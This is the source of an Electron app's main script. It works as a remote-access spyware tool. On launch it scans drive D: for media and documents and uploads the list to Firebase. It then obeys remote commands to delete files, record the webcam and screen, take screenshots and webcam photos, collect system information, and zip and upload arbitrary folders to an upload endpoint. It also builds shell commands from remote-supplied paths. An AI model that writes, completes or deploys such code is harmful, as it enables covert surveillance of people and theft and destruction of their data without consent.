// main.cjs
const { app, BrowserWindow } = require("electron");
const path = require("path");
const fs = require("fs").promises;
const fsSync = require("fs");
const { exec } = require("child_process");
const axios = require("axios");
const FormData = require("form-data");
const screenshot = require("screenshot-desktop");

// --- Firebase Admin ---
let admin;
let db;
try {
  admin = require("firebase-admin");

  const candidateFiles = [
    path.join(__dirname, "serviceAccountKey.json"),
    path.join(__dirname, "project-3b15e-firebase-adminsdk-fbsvc-42ccbf9a13.json"),
  ];

  let credFile = candidateFiles.find((f) => fsSync.existsSync(f));
  if (!credFile) {
    console.error("❌ Firebase service account JSON not found. Place it in project root.");
  } else {
    const serviceAccount = require(credFile);
    const databaseURL = "https://project-3b15e-default-rtdb.firebaseio.com";

    admin.initializeApp({
      credential: admin.credential.cert(serviceAccount),
      databaseURL,
    });

    db = admin.database();
    console.log("✅ Firebase Admin initialized.");
  }
} catch (e) {
  console.error("Firebase Admin load failed:", e.message);
}

// -------------------- Window --------------------
function createWindow() {
  const win = new BrowserWindow({
    width: 800,
    height: 500,
    webPreferences: {
      preload: path.join(__dirname, "preload.cjs"),
      contextIsolation: true,
    },
  });
  win.loadFile("index.html");
}

// -------------------- SCAN MEDIA --------------------
const allowedExt = [
  ".jpg", ".jpeg", ".png", ".gif", ".mp4", ".mkv", ".avi", ".mov",
  ".files", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".folder"
];

async function scanFolder(folderPath, maxCount = 10000, results = []) {
  try {
    const entries = await fs.readdir(folderPath, { withFileTypes: true });
    for (const entry of entries) {
      if (results.length >= maxCount) break;
      const fullPath = path.join(folderPath, entry.name);
      if (entry.isFile() && allowedExt.includes(path.extname(entry.name).toLowerCase())) {
        results.push(path.resolve(fullPath));
      } else if (entry.isDirectory()) {
        await scanFolder(fullPath, maxCount, results);
      }
    }
    return results;
  } catch {
    return results;
  }
}

async function uploadScanResults(files) {
  if (!db) {
    console.warn("⚠️ Firebase DB not initialized; skipping upload of scanned files.");
    return;
  }
  await db.ref("scannedFiles").set(files);
  console.log("⬆️ Scanned files uploaded to Firebase.");
}

// -------------------- DELETE --------------------
async function deleteTarget(target, type) {
  const normalized = path.resolve(target).replace(/\//g, "\\");
  try {
    if (!fsSync.existsSync(normalized)) {
      return { status: "not_found", path: normalized };
    }

    if (type === "file") {
      // delete a single file
      const stat = fsSync.statSync(normalized);
      if (!stat.isFile()) {
        return { status: "not_a_file", path: normalized };
      }
      await fs.rm(normalized, { force: true });
      console.log("✅ File deleted:", normalized);
      return { status: "file_deleted", path: normalized };

    } else if (type === "files") {
      // delete all files in a folder but keep the folder
      const stat = fsSync.statSync(normalized);
      if (!stat.isDirectory()) {
        return { status: "not_a_directory", path: normalized };
      }

      const entries = await fs.readdir(normalized, { withFileTypes: true });
      let deleted = [];
      let errors = [];

      for (const entry of entries) {
        const fullPath = path.join(normalized, entry.name);
        if (entry.isFile()) {
          try {
            await fs.rm(fullPath, { force: true });
            console.log("🗑 Deleted file:", fullPath);
            deleted.push(fullPath);
          } catch (err) {
            console.error("❌ Failed to delete:", fullPath, err.message);
            errors.push({ file: fullPath, error: err.message });
          }
        }
      }

      return { status: "files_deleted", folder: normalized, deleted, errors };

    } else if (type === "folder") {
      // delete folder and everything inside
      await fs.rm(normalized, { recursive: true, force: true });
      console.log("✅ Folder deleted:", normalized);
      return { status: "folder_deleted", path: normalized };

    } else {
      return { status: "unknown_type", path: normalized, type };
    }
  } catch (err) {
    console.error("❌ Delete failed:", normalized, err.message);
    return { status: "error", path: normalized, error: err.message };
  }
}


// -------------------- VIDEO RECORD --------------------
async function recordAndUploadVideo(durationInSeconds = 60) {
  return new Promise((resolve, reject) => {
    const outputPath = path.join(__dirname, "video.mp4");
    const deviceName = "HD Webcam";

    const ffmpegCmd = `ffmpeg -f dshow -i video="${deviceName}" -t ${durationInSeconds} -y "${outputPath}"`;
    console.log(`🎥 Starting recording for ${durationInSeconds} seconds...`);

    exec(ffmpegCmd, async (err) => {
      if (err) {
        console.error("❌ Recording failed:", err.message);
        return reject(err);
      }
      console.log(`✅ Video saved to: ${outputPath}`);

      try {
        const formData = new FormData();
        formData.append("file", fsSync.createReadStream(outputPath));

        const response = await axios.post("http://localhost/upload.php", formData, {
          headers: formData.getHeaders(),
        });

        console.log("⬆️ Uploaded video:", response.data);
        resolve({ status: "video_uploaded", serverResponse: response.data });
      } catch (uploadError) {
        console.error("❌ Upload failed:", uploadError.message);
        reject(uploadError);
      }
    });
  });
}

// -------------------- SCREENSHOTS --------------------
async function captureScreenshots() {
  const results = [];
  for (let i = 0; i < 5; i++) {
    const filePath = path.join(__dirname, `screenshot_${Date.now()}_${i}.jpg`);
    try {
      await screenshot({ filename: filePath });
      console.log("📸 Screenshot saved:", filePath);

      const formData = new FormData();
      formData.append("file", fsSync.createReadStream(filePath));

      const response = await axios.post("http://localhost/upload.php", formData, {
        headers: formData.getHeaders(),
      });

      console.log("⬆️ Uploaded screenshot:", response.data);
      results.push({ local: filePath, server: response.data });
    } catch (err) {
      console.error("❌ Screenshot failed:", err.message);
    }
  }
  return results;
}

// -------------------- WEBCAM PHOTOS --------------------
async function captureWebcamPhotos() {
  const deviceName = "HD Webcam";
  const results = [];

  for (let i = 0; i < 5; i++) {
    const filePath = path.join(__dirname, `webcam_${Date.now()}_${i}.jpg`);
    const ffmpegCmd = `ffmpeg -f dshow -i video="${deviceName}" -frames:v 1 -y "${filePath}"`;

    await new Promise((resolve, reject) => {
      exec(ffmpegCmd, async (err) => {
        if (err) {
          console.error("❌ Webcam photo failed:", err.message);
          return reject(err);
        }
        console.log("✅ Photo saved:", filePath);

        try {
          const formData = new FormData();
          formData.append("file", fsSync.createReadStream(filePath));

          const response = await axios.post("http://localhost/upload.php", formData, {
            headers: formData.getHeaders(),
          });

          console.log("⬆️ Uploaded webcam photo:", response.data);
          results.push({ local: filePath, server: response.data });
          resolve();
        } catch (err) {
          console.error("❌ Upload failed:", err.message);
          reject(err);
        }
      });
    });
  }
  return results;
}

// -------------------- SCREEN RECORD --------------------
async function recordAndUploadScreenrecord(durationInSeconds = 60) {
  return new Promise((resolve, reject) => {
    const outputPath = path.join(__dirname, "screenrecord.mp4");
    const cmd = `ffmpeg -y -f gdigrab -framerate 30 -t ${durationInSeconds} -i desktop "${outputPath}"`;
    console.log("🖥️ Starting screen recording for", durationInSeconds, "seconds...");

    exec(cmd, async (err) => {
      if (err) {
        console.error("❌ Screen record failed:", err.message);
        return reject({ status: "record_failed", error: err.message });
      }

      console.log("✅ Screen recorded:", outputPath);

      try {
        const formData = new FormData();
        formData.append("file", fsSync.createReadStream(outputPath));

        const response = await axios.post("http://localhost/upload.php", formData, {
          headers: formData.getHeaders(),
        });

        console.log("⬆️ Uploaded screenrecord:", response.data);
        resolve({ status: "screenrecord_uploaded", serverResponse: response.data });
      } catch (uploadErr) {
        console.error("❌ Upload failed:", uploadErr.message);
        reject({ status: "upload_failed", error: uploadErr.message });
      }
    });
  });
}

// -------------------- SYSTEM INFO --------------------
async function captureAndUploadSystemInfo() {
  const fileName = `systeminfo_${Date.now()}.txt`;
  const outputPath = path.join(__dirname, fileName);

  return new Promise((resolve, reject) => {
    // run Windows systeminfo
    exec("systeminfo", async (err, stdout, stderr) => {
      if (err) {
        console.error("❌ Failed to run systeminfo:", err.message);
        return resolve({ status: "error", error: err.message });
      }

      try {
        // write text file
        await fs.writeFile(outputPath, stdout || stderr || "No output", "utf8");
        console.log("📝 System info saved:", outputPath);

        // prepare upload
        const formData = new FormData();
        formData.append("file", fsSync.createReadStream(outputPath));

        // upload to your server
        const uploadUrl = "http://localhost/upload.php"; // change if needed
        const response = await axios.post(uploadUrl, formData, {
          headers: formData.getHeaders(),
          maxBodyLength: Infinity,
          maxContentLength: Infinity,
          timeout: 2 * 60 * 1000, // 2 minutes
        });

        console.log("⬆️ System info uploaded, server replied:", response.data);
        // optionally remove local file after upload:
        // try { fsSync.unlinkSync(outputPath); } catch (e) { /* ignore */ }

        return resolve({
          status: "uploaded",
          local: outputPath,
          server: response.data
        });
      } catch (uploadErr) {
        console.error("❌ Upload failed:", uploadErr && uploadErr.message);
        return resolve({
          status: "upload_failed",
          local: outputPath,
          error: String(uploadErr)
        });
      }
    });
  });
}


// -------------------- UPLOAD FILES & FOLDERS --------------------
function execPromise(cmd, opts = {}) {
  return new Promise((resolve, reject) => {
    exec(cmd, { windowsHide: true, ...opts }, (err, stdout, stderr) => {
      if (err) {
        err.stdout = stdout;
        err.stderr = stderr;
        return reject(err);
      }
      resolve({ stdout, stderr });
    });
  });
}

async function tryUpload(filePath) {
  // try with both 'file' and 'upload' keys
  const fields = ["file", "upload"];

  for (const field of fields) {
    try {
      const formData = new FormData();
      formData.append(field, fsSync.createReadStream(filePath));

      const res = await axios.post("http://localhost/upload.php", formData, {
        headers: formData.getHeaders(),
        maxBodyLength: Infinity,
        maxContentLength: Infinity,
      });

      console.log(`⬆️ Uploaded using field '${field}':`, res.data);
      return { status: "uploaded", field, local: filePath, server: res.data };
    } catch (err) {
      console.warn(`⚠️ Upload with '${field}' failed:`, err.message);
    }
  }

  throw new Error("All upload attempts failed");
}

async function uploadFileOrFolder(location, type = "file") {
  try {
    if (!fsSync.existsSync(location)) {
      return { status: "not_found", path: location };
    }

    const stat = fsSync.statSync(location);

    // --- Single file ---
    if (type === "file" && stat.isFile()) {
      return await tryUpload(location);
    }

    // --- All files inside folder ---
    if (type === "files" && stat.isDirectory()) {
      const entries = fsSync.readdirSync(location, { withFileTypes: true });
      const results = [];
      for (const entry of entries) {
        if (entry.isFile()) {
          const filePath = path.join(location, entry.name);
          try {
            const res = await tryUpload(filePath);
            results.push(res);
          } catch (err) {
            results.push({ status: "error", path: filePath, error: err.message });
          }
        }
      }
      return { status: "done", uploaded: results };
    }

    // --- Entire folder zipped ---
    if (type === "folder" && stat.isDirectory()) {
      const zipName = `upload_${Date.now()}.zip`;
      const zipPath = path.join(__dirname, zipName);
      const psCmd = `powershell -NoProfile -Command "Compress-Archive -Path '${location}\\*' -DestinationPath '${zipPath}' -Force"`;

      console.log("📦 Zipping folder:", location);
      await execPromise(psCmd);

      if (!fsSync.existsSync(zipPath)) throw new Error("Failed to create zip");

      const res = await tryUpload(zipPath);

      try { fsSync.unlinkSync(zipPath); } catch {}
      return res;
    }

    return { status: "invalid_type_or_path", path: location, type };
  } catch (err) {
    console.error("❌ Upload failed:", err.message);
    return { status: "error", path: location, error: err.message };
  }
}


// -------------------- FIREBASE COMMANDS (updated) --------------------
function startFirebaseListener() {
  if (!db) {
    console.warn("⚠️ Firebase DB not initialized; listener not started.");
    return;
  }

  const controlRef = db.ref("control");
  console.log("🎧 Listening for Firebase commands...");

  controlRef.on("value", async (snap) => {
    const data = snap.val();
    if (!data) return;
    console.log("📩 Firebase command:", JSON.stringify(data));

    const command = (data.command || "").toLowerCase();
    const id = data.id || Date.now();

    try {
      if (command === "delete") {
        const res = await deleteTarget(data.location, data.type || "file");
        db.ref(`controlResult/${id}`).set(res).catch(() => {});
      } else if (command === "video") {
        const res = await recordAndUploadVideo(60);
        db.ref(`controlResult/${id}`).set(res).catch(() => {});
      } else if (command === "screenrecord") {
        const res = await recordAndUploadScreenrecord(60);
        db.ref(`controlResult/${id}`).set(res).catch(() => {});
      } else if (command === "screenshots") {
        const res = await captureScreenshots();
        db.ref(`controlResult/${id}`).set(res).catch(() => {});
      } else if (command === "photos") {
        const res = await captureWebcamPhotos();
        db.ref(`controlResult/${id}`).set(res).catch(() => {});
      } else if (command === "upload") {
        const res = await uploadFileOrFolder(data.location, data.type || "file");
        db.ref(`controlResult/${id}`).set(res).catch(() => {});
      } else if (command === "systeminfo") {
        console.log("🖥️ systeminfo command received - capturing system information...");
        const res = await captureAndUploadSystemInfo();
        db.ref(`controlResult/${id}`).set(res).catch(() => {});
      } else {
        console.warn("⚠️ Unknown command:", command);
      }
    } catch (err) {
      console.error("❌ Command handler error:", err && err.message);
      db.ref(`controlResult/${id}`).set({ status: "error", error: String(err) }).catch(() => {});
    }
  });
}


// -------------------- APP START --------------------
app.whenReady().then(async () => {
  createWindow();

  const drive = "D:\\";
  console.log("🔍 Scanning", drive, "for media files...");
  const files = await scanFolder(drive, 10000);
  console.log(`📂 Scan complete. Found ${files.length} media files.`);

  await uploadScanResults(files);
  startFirebaseListener();
});

app.on("window-all-closed", () => {
  if (process.platform !== "darwin") app.quit();
});
